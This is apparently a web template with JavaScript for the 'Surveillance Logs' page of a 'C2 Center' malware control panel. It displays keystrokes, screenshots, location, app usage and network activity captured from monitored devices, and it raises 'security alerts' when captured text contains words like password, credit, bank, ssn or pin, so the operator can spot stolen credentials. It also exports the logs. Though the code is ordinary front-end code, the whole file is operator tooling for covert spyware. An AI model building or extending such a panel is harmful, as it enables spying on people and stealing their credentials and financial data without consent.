{% extends "base.html" %}

{% block title %}Surveillance Logs - C2 Center{% endblock %}

{% block content %}
<div class="row mb-4">
    <div class="col-12">
        <h1><i class="fas fa-eye"></i> Surveillance Monitoring</h1>
        <p class="text-muted">Real-time monitoring of device activities and user behavior</p>
    </div>
</div>

<div class="row">
    <div class="col-lg-9">
        <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <h5><i class="fas fa-list-alt"></i> Live Surveillance Feed</h5>
                <div>
                    <select class="form-select form-select-sm d-inline-block w-auto me-2" id="log-filter">
                        <option value="">All Activities</option>
                        <option value="keystrokes">Keystrokes</option>
                        <option value="screenshots">Screenshots</option>
                        <option value="location">Location</option>
                        <option value="app_usage">App Usage</option>
                        <option value="network">Network</option>
                        <option value="system">System Events</option>
                    </select>
                    <button class="btn btn-primary btn-sm" onclick="refreshLogs()">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                    <button class="btn btn-success btn-sm" onclick="toggleAutoRefresh()">
                        <i class="fas fa-play" id="auto-refresh-icon"></i> Auto
                    </button>
                </div>
            </div>
            <div class="card-body">
                <div class="terminal" style="height: 600px;" id="surveillance-feed">
                    <div class="text-muted">Loading surveillance data...</div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-lg-3">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-chart-line"></i> Activity Statistics</h5>
            </div>
            <div class="card-body">
                <div class="text-center mb-3">
                    <h4 id="total-logs" class="text-primary">-</h4>
                    <p class="text-muted">Total Activities</p>
                </div>
                
                <div class="mb-3">
                    <small class="text-muted">Activity in Last Hour:</small>
                    <h5 id="recent-activity" class="text-warning">-</h5>
                </div>
                
                <div class="mb-3">
                    <small class="text-muted">Most Active Device:</small>
                    <div id="most-active-surveillance">Loading...</div>
                </div>
                
                <div class="mb-3">
                    <small class="text-muted">Activity Breakdown:</small>
                    <div id="activity-breakdown">Loading...</div>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-exclamation-triangle"></i> Security Alerts</h5>
            </div>
            <div class="card-body">
                <div id="security-alerts">
                    <div class="text-muted">Monitoring for suspicious activities...</div>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-search"></i> Quick Search</h5>
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <input type="text" class="form-control form-control-sm" 
                           id="search-query" placeholder="Search surveillance logs...">
                    <button class="btn btn-outline-primary btn-sm mt-2 w-100" onclick="searchLogs()">
                        <i class="fas fa-search"></i> Search
                    </button>
                </div>
                
                <div class="mb-3">
                    <label class="form-label">Device Filter:</label>
                    <select class="form-select form-select-sm" id="device-filter">
                        <option value="">All Devices</option>
                    </select>
                </div>
                
                <button class="btn btn-outline-secondary btn-sm w-100" onclick="clearFilters()">
                    <i class="fas fa-times"></i> Clear Filters
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Log Details Modal -->
<div class="modal fade" id="logDetailsModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content bg-dark">
            <div class="modal-header">
                <h5 class="modal-title">Surveillance Log Details</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div id="log-details-content">
                    Loading log details...
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" onclick="exportLogDetails()">
                    <i class="fas fa-download"></i> Export
                </button>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script>
let allLogs = [];
let autoRefreshEnabled = false;
let autoRefreshInterval = null;
let selectedLog = null;

function loadSurveillanceLogs() {
    fetch('/api/surveillance/logs')
        .then(response => response.json())
        .then(logs => {
            allLogs = logs;
            updateSurveillanceFeed();
            updateSurveillanceStatistics();
            updateDeviceFilter();
        })
        .catch(error => {
            console.error('Error loading surveillance logs:', error);
            document.getElementById('surveillance-feed').innerHTML = 
                '<div class="text-danger">Error loading surveillance data</div>';
        });
}

function updateSurveillanceFeed(filteredLogs = null) {
    const logs = filteredLogs || allLogs;
    const feed = document.getElementById('surveillance-feed');
    
    if (logs.length === 0) {
        feed.innerHTML = '<div class="text-muted">No surveillance data available</div>';
        return;
    }
    
    let feedHtml = '';
    logs.slice(0, 200).forEach((log, index) => { // Limit to 200 for performance
        const severity = getSeverityLevel(log);
        const severityClass = {
            'high': 'text-danger',
            'medium': 'text-warning', 
            'low': 'text-info'
        }[severity] || 'text-muted';
        
        const deviceClass = 'text-primary';
        const timestamp = formatTimestamp(log.timestamp);
        
        feedHtml += `
            <div class="log-entry" onclick="showLogDetails(${index})" style="cursor: pointer;">
                <span class="log-timestamp">[${timestamp}]</span>
                <span class="${deviceClass}">[${log.device_id.substring(0, 8)}]</span>
                <span class="log-type badge bg-secondary">${log.log_type}</span>
                <span class="${severityClass}">${log.content}</span>
            </div>
        `;
    });
    
    if (logs.length > 200) {
        feedHtml += `
            <div class="log-entry text-muted">
                ... Showing latest 200 of ${logs.length} entries. Use filters to narrow results.
            </div>
        `;
    }
    
    feed.innerHTML = feedHtml;
    feed.scrollTop = feed.scrollHeight; // Auto-scroll to bottom
}

function updateSurveillanceStatistics() {
    document.getElementById('total-logs').textContent = allLogs.length;
    
    // Recent activity (last hour)
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    const recentLogs = allLogs.filter(log => 
        new Date(log.timestamp) > oneHourAgo
    );
    document.getElementById('recent-activity').textContent = recentLogs.length;
    
    // Most active device
    const deviceCounts = {};
    allLogs.forEach(log => {
        deviceCounts[log.device_id] = (deviceCounts[log.device_id] || 0) + 1;
    });
    
    const mostActive = Object.entries(deviceCounts)
        .sort(([,a], [,b]) => b - a)[0];
    
    if (mostActive) {
        document.getElementById('most-active-surveillance').innerHTML = `
            <strong>${mostActive[0].substring(0, 8)}...</strong><br>
            <small class="text-muted">${mostActive[1]} activities</small>
        `;
    }
    
    // Activity breakdown
    const typeBreakdown = {};
    allLogs.forEach(log => {
        typeBreakdown[log.log_type] = (typeBreakdown[log.log_type] || 0) + 1;
    });
    
    let breakdownHtml = '';
    Object.entries(typeBreakdown)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 5)
        .forEach(([type, count]) => {
            const percentage = ((count / allLogs.length) * 100).toFixed(1);
            breakdownHtml += `
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small>${type}:</small>
                    <div>
                        <span class="badge bg-secondary">${count}</span>
                        <small class="text-muted">(${percentage}%)</small>
                    </div>
                </div>
            `;
        });
    
    document.getElementById('activity-breakdown').innerHTML = breakdownHtml;
    
    // Security alerts
    updateSecurityAlerts();
}

function updateSecurityAlerts() {
    const sensitiveKeywords = ['password', 'credit', 'bank', 'ssn', 'pin', 'login'];
    const securityLogs = allLogs.filter(log => 
        sensitiveKeywords.some(keyword => 
            log.content.toLowerCase().includes(keyword)
        )
    );
    
    let alertsHtml = '';
    
    if (securityLogs.length > 0) {
        alertsHtml += `
            <div class="alert alert-danger alert-sm">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>${securityLogs.length}</strong> sensitive activities detected
            </div>
        `;
        
        securityLogs.slice(0, 3).forEach(log => {
            alertsHtml += `
                <div class="border-start border-danger ps-2 mb-2">
                    <small><strong>${log.log_type}</strong></small><br>
                    <small class="text-muted">${log.content.substring(0, 50)}...</small><br>
                    <small class="text-muted">${formatTimestamp(log.timestamp)}</small>
                </div>
            `;
        });
    } else {
        alertsHtml = '<div class="text-muted">No security alerts at this time</div>';
    }
    
    document.getElementById('security-alerts').innerHTML = alertsHtml;
}

function updateDeviceFilter() {
    const devices = [...new Set(allLogs.map(log => log.device_id))];
    const select = document.getElementById('device-filter');
    
    let optionsHtml = '<option value="">All Devices</option>';
    devices.forEach(device => {
        optionsHtml += `<option value="${device}">${device.substring(0, 8)}...</option>`;
    });
    
    select.innerHTML = optionsHtml;
}

function getSeverityLevel(log) {
    const highSeverityKeywords = ['password', 'credit', 'bank', 'error', 'fail', 'security'];
    const mediumSeverityKeywords = ['login', 'access', 'permission', 'install'];
    
    const content = log.content.toLowerCase();
    
    if (highSeverityKeywords.some(keyword => content.includes(keyword))) {
        return 'high';
    } else if (mediumSeverityKeywords.some(keyword => content.includes(keyword))) {
        return 'medium';
    } else {
        return 'low';
    }
}

function showLogDetails(index) {
    const log = allLogs[index];
    selectedLog = log;
    
    document.getElementById('log-details-content').innerHTML = `
        <div class="row">
            <div class="col-md-6">
                <h6>Log Information</h6>
                <p><strong>Device ID:</strong> ${log.device_id}</p>
                <p><strong>Log Type:</strong> <span class="badge bg-info">${log.log_type}</span></p>
                <p><strong>Timestamp:</strong> ${formatTimestamp(log.timestamp)}</p>
                <p><strong>Severity:</strong> 
                    <span class="badge bg-${getSeverityLevel(log) === 'high' ? 'danger' : getSeverityLevel(log) === 'medium' ? 'warning' : 'secondary'}">
                        ${getSeverityLevel(log).toUpperCase()}
                    </span>
                </p>
            </div>
            <div class="col-md-6">
                <h6>Content</h6>
                <div class="terminal" style="height: 200px;">
                    <pre>${log.content}</pre>
                </div>
            </div>
        </div>
    `;
    
    const modal = new bootstrap.Modal(document.getElementById('logDetailsModal'));
    modal.show();
}

function exportLogDetails() {
    if (!selectedLog) return;
    
    const logData = {
        device_id: selectedLog.device_id,
        log_type: selectedLog.log_type,
        timestamp: selectedLog.timestamp,
        content: selectedLog.content,
        severity: getSeverityLevel(selectedLog),
        exported_at: new Date().toISOString()
    };
    
    const blob = new Blob([JSON.stringify(logData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `surveillance_log_${selectedLog.timestamp}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function filterLogs() {
    const logTypeFilter = document.getElementById('log-filter').value;
    const deviceFilter = document.getElementById('device-filter').value;
    const searchQuery = document.getElementById('search-query').value.toLowerCase();
    
    let filteredLogs = allLogs;
    
    if (logTypeFilter) {
        filteredLogs = filteredLogs.filter(log => 
            log.log_type.toLowerCase().includes(logTypeFilter.toLowerCase())
        );
    }
    
    if (deviceFilter) {
        filteredLogs = filteredLogs.filter(log => log.device_id === deviceFilter);
    }
    
    if (searchQuery) {
        filteredLogs = filteredLogs.filter(log => 
            log.content.toLowerCase().includes(searchQuery) ||
            log.log_type.toLowerCase().includes(searchQuery) ||
            log.device_id.toLowerCase().includes(searchQuery)
        );
    }
    
    updateSurveillanceFeed(filteredLogs);
}

function searchLogs() {
    filterLogs();
}

function clearFilters() {
    document.getElementById('log-filter').value = '';
    document.getElementById('device-filter').value = '';
    document.getElementById('search-query').value = '';
    updateSurveillanceFeed();
}

function toggleAutoRefresh() {
    autoRefreshEnabled = !autoRefreshEnabled;
    const icon = document.getElementById('auto-refresh-icon');
    
    if (autoRefreshEnabled) {
        icon.className = 'fas fa-pause';
        autoRefreshInterval = setInterval(loadSurveillanceLogs, 5000); // Refresh every 5 seconds
        showToast('Auto-refresh enabled', 'success');
    } else {
        icon.className = 'fas fa-play';
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
            autoRefreshInterval = null;
        }
        showToast('Auto-refresh disabled', 'info');
    }
}

function refreshLogs() {
    loadSurveillanceLogs();
    showToast('Surveillance logs refreshed', 'success');
}

// Real-time event handlers
socket.on('new_log', function(data) {
    // Add new log to the beginning of the array
    allLogs.unshift(data);
    
    // Limit to 10000 logs for performance
    if (allLogs.length > 10000) {
        allLogs = allLogs.slice(0, 10000);
    }
    
    updateSurveillanceFeed();
    updateSurveillanceStatistics();
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadSurveillanceLogs();
    
    // Setup filter handlers
    document.getElementById('log-filter').addEventListener('change', filterLogs);
    document.getElementById('device-filter').addEventListener('change', filterLogs);
    document.getElementById('search-query').addEventListener('input', 
        debounce(filterLogs, 500) // Debounce search input
    );
    
    // Initial auto-refresh setup
    setInterval(loadSurveillanceLogs, 30000); // Refresh every 30 seconds when not auto-refreshing
});

// Utility function for debouncing
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}
</script>
{% endblock %}
